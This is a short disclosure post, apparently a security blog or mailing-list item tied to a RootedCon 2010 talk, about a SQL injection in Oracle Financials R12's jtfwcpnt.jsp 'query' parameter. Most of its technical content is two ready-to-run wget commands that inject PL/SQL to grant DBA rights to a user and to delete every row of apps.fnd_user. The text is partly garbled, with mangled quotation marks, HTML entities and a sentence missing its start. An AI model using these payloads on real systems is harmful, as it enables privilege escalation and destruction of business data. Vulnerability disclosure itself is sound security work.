Oracle Financials R12 SQL injection vulnerability 
=================================================

Yesterday a friend of mine told me that I "forget" to share with the
conference RootedCon 2010 [2].

is common with Oracle software). In Oracle Financials R12 there is one
script called jtfwcpnt.jsp which receives a parameter called "query". I
think that no other explanation is required. Anyway, this is a simple

$ export TARGET=â€http://<target>:<port>/OA_HTMLâ€
$ wget -O - â€œ$TARGET/OA.jspâ€ "$TARGET/jtfwcpnt.jsp?query=begin%20execute
%20immediate%20&#039;grant%20dba%20to%20mom&#039;;%20end;â€
$ wget -O - â€œ$TARGET/OA.jspâ€ "$TARGET/jtfwcpnt.jsp?query=begin%20execute
%20immediate%20&#039;delete%20from%20apps.fnd_user&#039;;%20commit;end;â€

Just in case you don&#039;t want to view the slides online or you hate (or
fear) Flash as I do, you can download the slides from my website [3] in
ODP format.
